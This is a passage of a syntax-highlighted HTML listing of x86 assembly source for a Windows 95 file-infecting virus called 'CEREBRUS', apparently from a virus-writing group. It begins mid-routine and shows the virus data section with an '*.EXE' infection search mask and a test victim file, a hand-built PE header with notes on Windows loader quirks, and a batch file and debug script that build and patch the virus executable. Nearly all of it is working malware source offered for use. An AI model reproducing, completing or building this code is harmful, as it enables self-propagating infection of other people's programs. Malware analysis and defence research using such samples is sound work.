        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">000fh</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">4</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">jle</span><span class="sc0">     </span><span class="sc5">number</span><span class="sc0">

        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0ah</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">41h</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">letter</span><span class="sc0">

</span><span class="sc5">number</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">30h</span><span class="sc0">
</span><span class="sc5">letter</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc2">0fffCh</span><span class="sc0">
        </span><span class="sc6">jne</span><span class="sc0">     </span><span class="sc5">digit_loop</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">

 
        </span><span class="sc6">PopA</span><span class="sc0">

        </span><span class="sc6">Ret</span><span class="sc0">
</span><span class="sc1">;===================================================================</span><span class="sc0">
</span><span class="sc5">MURK</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'MURKRY/IkX'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">VIRII</span><span class="sc0">   </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'CEREBRUS'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">info</span><span class="sc0">    </span><span class="sc9">DB</span><span class="sc0">      </span><span class="sc12">'The three head guardian, is in your computer, fear no more'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
 
</span><span class="sc5">numb</span><span class="sc0">            </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">

</span><span class="sc5">blank</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">' '</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">OldOff</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">100h</span><span class="sc0">

</span><span class="sc5">NewHost</span><span class="sc0">         </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'*.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">victim</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Notepad.exe'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">  </span><span class="sc1">;in real virus this would be in the</span><span class="sc0">
                                       </span><span class="sc1">;find file info </span><span class="sc0">
</span><span class="sc5">filename</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">256D</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">tempfile</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">256D</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">        
</span><span class="sc5">hfindFile</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">              </span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">fHandle</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">NumRead</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">pCommandLine</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">256D</span><span class="sc0"> </span><span class="sc9">DUP</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc5">FindData</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">fileattr</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;   DWORD dwFileAttributes;                      ;00 00 00 00 </span><span class="sc0">
</span><span class="sc5">fCreat</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">;   FILETIME ftCreationTime;            ;DD ?,?  ;</span><span class="sc0">
</span><span class="sc5">fAccess</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">;   FILETIME ftLastAccessTime;          ;DD ?,?  ;</span><span class="sc0">
</span><span class="sc5">fWrite</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">2</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">        </span><span class="sc1">;   FILETIME ftLastWriteTime;           ;DD ?,?  ;</span><span class="sc0">
</span><span class="sc5">fsizelow</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;   DWORD nFileSizeHigh;                         ;</span><span class="sc0">
</span><span class="sc5">fsizehigh</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;   DWORD nFileSizeLow;                          ;</span><span class="sc0">
</span><span class="sc5">fresv1</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;   DWORD dwReserved0;                           ;</span><span class="sc0">
</span><span class="sc5">fresv2</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">               </span><span class="sc1">;   DWORD dwReserved1;                           ;</span><span class="sc0">
</span><span class="sc5">fName</span><span class="sc0">           </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">255d</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;   CHAR cFileName[MAX_PATH]; 255B               ;</span><span class="sc0">
</span><span class="sc5">fdosname</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">14d</span><span class="sc0">  </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">     </span><span class="sc1">;   CHAR cAlternateFileName[ 14 ];               ;</span><span class="sc0">

</span><span class="sc5">SizeOfFile</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">FleHdle</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">
</span><span class="sc5">ProcessInfo</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">4h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">StartupInfo</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">18h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">buffer</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">


</span><span class="sc1">;-------------</span><span class="sc0">
</span><span class="sc5">ttle</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Hello'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">msg</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'from host'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

</span><span class="sc5">CodeEnds</span><span class="sc4">:</span><span class="sc0">


        </span><span class="sc6">Call</span><span class="sc0">     </span><span class="sc5">MessageBoxA</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ttle</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">msg</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc10">large</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">Call</span><span class="sc0">    </span><span class="sc5">ExitProcess</span><span class="sc0">
        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">CodeEnds</span><span class="sc0">


</span><span class="sc1">;[1.INC]</span><span class="sc0">

</span><span class="sc1">;1.inc</span><span class="sc0">
</span><span class="sc5">PEheader</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'PE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">           </span><span class="sc1">;200</span><span class="sc0">
</span><span class="sc5">Machine</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">014ch</span><span class="sc0">
</span><span class="sc5">NumSect</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0002h</span><span class="sc0">           </span><span class="sc1">;Seems Win95 does check this but if</span><span class="sc0">
                                        </span><span class="sc1">; there is a Section Header entry</span><span class="sc0">
                                        </span><span class="sc1">; it will load that section or as</span><span class="sc0">
                                        </span><span class="sc1">; many sections as there are entries</span><span class="sc0">
                                        </span><span class="sc1">; in other words it loads till</span><span class="sc0">
                                        </span><span class="sc1">; the next section header is 0000h</span><span class="sc0">
                                        </span><span class="sc1">; or it has load the NumSect</span><span class="sc0">

</span><span class="sc5">TimeDate</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">6f052098h</span><span class="sc0">
</span><span class="sc5">PtrSymTble</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">Numsymbols</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">SizeOpHder</span><span class="sc0">      </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">00e0h</span><span class="sc0">
</span><span class="sc5">Char</span><span class="sc0">            </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">818eh</span><span class="sc0">

</span><span class="sc5">Magic</span><span class="sc0">           </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">010bh</span><span class="sc0">
</span><span class="sc5">LinkerVer</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">1902h</span><span class="sc0">
</span><span class="sc5">SiZeOfCOde</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">       </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CodeEnds</span><span class="sc0">  </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0">

</span><span class="sc5">SizeOfInitData</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00003000h</span><span class="sc0">
</span><span class="sc5">SizeOfUnintdata</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">000000000</span><span class="sc0">

</span><span class="sc5">EntryPoint</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">Begin</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">
</span><span class="sc5">BaseCode</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00400000h</span><span class="sc0">       
</span><span class="sc5">BaseData</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00400000h</span><span class="sc0">

</span><span class="sc5">ImageBase</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00400000h</span><span class="sc0">
</span><span class="sc5">SectionAlign</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00001000h</span><span class="sc0">
</span><span class="sc5">FileAlign</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000200h</span><span class="sc0">       

</span><span class="sc5">OsMajor</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0001h</span><span class="sc0">
</span><span class="sc5">Osminor</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">UseMajor</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">UseMinor</span><span class="sc0">        </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">SubSysMajor</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0003h</span><span class="sc0">
</span><span class="sc5">SubSysMinor</span><span class="sc0">     </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">000Ah</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">
                </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0</span><span class="sc0">
</span><span class="sc5">ImageSize</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00010000h</span><span class="sc0">
</span><span class="sc5">HeaderSize</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">CDseg</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0">  
</span><span class="sc5">FileCheck</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0h</span><span class="sc0">                              </span><span class="sc1">;checksum</span><span class="sc0">
</span><span class="sc5">Subsystem</span><span class="sc0">       </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0002h</span><span class="sc0">
</span><span class="sc5">DllFlag</span><span class="sc0">         </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc2">0000h</span><span class="sc0">
</span><span class="sc5">StackRes</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00100000h</span><span class="sc0">
</span><span class="sc5">StackComm</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00002000h</span><span class="sc0">               </span><span class="sc1">;60</span><span class="sc0">
</span><span class="sc5">HeapRes</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00100000h</span><span class="sc0">
</span><span class="sc5">Heapcomm</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00001000h</span><span class="sc0">
</span><span class="sc5">LoaderFlag</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">NumberRVA</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000010h</span><span class="sc0">       </span><span class="sc1">;&lt;this determines how big the</span><span class="sc0">
                                        </span><span class="sc1">;the next chunk of code is according</span><span class="sc0">
                                        </span><span class="sc1">; to the docs but even put zero</span><span class="sc0">
                                        </span><span class="sc1">;here you could crash if you put</span><span class="sc0">
                                        </span><span class="sc1">; anything in those fields</span><span class="sc0">
                                        </span><span class="sc1">; Win95 does not check this field</span><span class="sc0">
                                        </span><span class="sc1">; at least it appears this way </span><span class="sc0">
                                        </span><span class="sc1">; also the rva do not need to be at </span><span class="sc0">
                                        </span><span class="sc1">; section alignemnt for the next bit</span><span class="sc0">
                                        </span><span class="sc1">; of whats is id'd as RVA's</span><span class="sc0">

</span><span class="sc5">ExprtRva</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">TotExpSze</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc1">;Take this we are pointing this to a section alignment but you do not have to</span><span class="sc0">
</span><span class="sc1">;do this it can point anywhere as long as the structure it expects to see is</span><span class="sc0">
</span><span class="sc1">; there</span><span class="sc0">
</span><span class="sc5">ImprtRva</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">IDATA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">PEheader</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">LoadAT</span><span class="sc0">      
</span><span class="sc5">TotImpSze</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EndIDATA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">Offset</span><span class="sc0"> </span><span class="sc5">IDATA</span><span class="sc0">  

</span><span class="sc1">;-----------------------------------------------------------</span><span class="sc0">
</span><span class="sc5">ResRva</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0000000h</span><span class="sc0">
</span><span class="sc5">TotResSze</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">0000000h</span><span class="sc0">

</span><span class="sc5">ExcpRva</span><span class="sc0">         </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">TotEcpSze</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">SecRva</span><span class="sc0">          </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">TotSecSze</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">FixUpRva</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">TotFixSze</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">DebugTble</span><span class="sc0">       </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">TotDebug</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">ImagDesc</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">TotDescSze</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">MachSpec</span><span class="sc0">        </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">MachSpecSze</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

</span><span class="sc5">ThreadLocal</span><span class="sc0">     </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">
</span><span class="sc5">ThreadLSze</span><span class="sc0">      </span><span class="sc9">dd</span><span class="sc0">      </span><span class="sc2">00000000h</span><span class="sc0">

                </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">30h</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc2">0</span><span class="sc4">)</span><span class="sc0">

</span><span class="sc1">; the PE header must be f8 in size this is where it starts</span><span class="sc0">
</span><span class="sc1">; to load the sections</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">

</span><span class="sc1">;[MK1.BAT]</span><span class="sc0">
</span><span class="sc5">del</span><span class="sc0"> </span><span class="sc5">h1.exe</span><span class="sc0">
</span><span class="sc5">tasm32</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">ml</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">m4</span><span class="sc0"> </span><span class="sc5">cerebrus</span><span class="sc4">,,</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">tlink32</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">Tpe</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc5">aa</span><span class="sc0"> </span><span class="sc4">/</span><span class="sc10">c</span><span class="sc0">  </span><span class="sc4">/</span><span class="sc5">v</span><span class="sc0"> </span><span class="sc5">cerebrus</span><span class="sc4">,</span><span class="sc5">cerebrus</span><span class="sc4">,,</span><span class="sc0"> </span><span class="sc5">import32.lib</span><span class="sc4">,</span><span class="sc0">  
</span><span class="sc5">copy</span><span class="sc0"> </span><span class="sc5">cerebrus.exe</span><span class="sc0"> </span><span class="sc5">host1.s</span><span class="sc0">
</span><span class="sc5">debug</span><span class="sc0"> </span><span class="sc4">&lt;</span><span class="sc5">d1.scr</span><span class="sc0">
</span><span class="sc5">del</span><span class="sc0"> </span><span class="sc5">cerebrus.exe</span><span class="sc0">
</span><span class="sc5">ren</span><span class="sc0"> </span><span class="sc5">h1.s</span><span class="sc0"> </span><span class="sc5">cerebrus.exe</span><span class="sc0">
</span><span class="sc5">del</span><span class="sc0"> </span><span class="sc5">host1.s</span><span class="sc0">
</span><span class="sc5">del</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc5">.obj</span><span class="sc0">
</span><span class="sc5">del</span><span class="sc0"> </span><span class="sc4">*</span><span class="sc5">.map</span><span class="sc0">

</span><span class="sc1">;[D1.SCR]</span><span class="sc0">
</span><span class="sc5">nhost1.s</span><span class="sc0">
</span><span class="sc5">l</span><span class="sc0">
</span><span class="sc5">e13d</span><span class="sc0">
</span><span class="sc2">6</span><span class="sc0">
</span><span class="sc5">nh1.s</span><span class="sc0">
</span><span class="sc5">w</span><span class="sc0">
</span><span class="sc5">q</span><span class="sc0">
                      
</span></div></body>
</html>
